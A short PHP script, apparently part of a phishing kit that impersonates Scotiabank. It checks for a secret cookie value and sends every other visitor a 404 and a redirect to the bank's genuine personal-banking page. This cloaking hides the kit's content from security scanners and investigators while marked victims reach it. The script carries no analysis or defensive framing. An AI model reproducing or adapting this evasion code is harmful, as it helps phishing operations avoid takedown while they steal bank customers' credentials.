<?php
$coo = @$_COOKIE["rowan"];
if ($coo != "attkinson") {  header('HTTP/1.0 404 Not Found');
               die("<html><meta http-equiv='refresh' content='0;url=https://www.scotiabank.com/ca/en/personal.html'></html>"); 
}
?>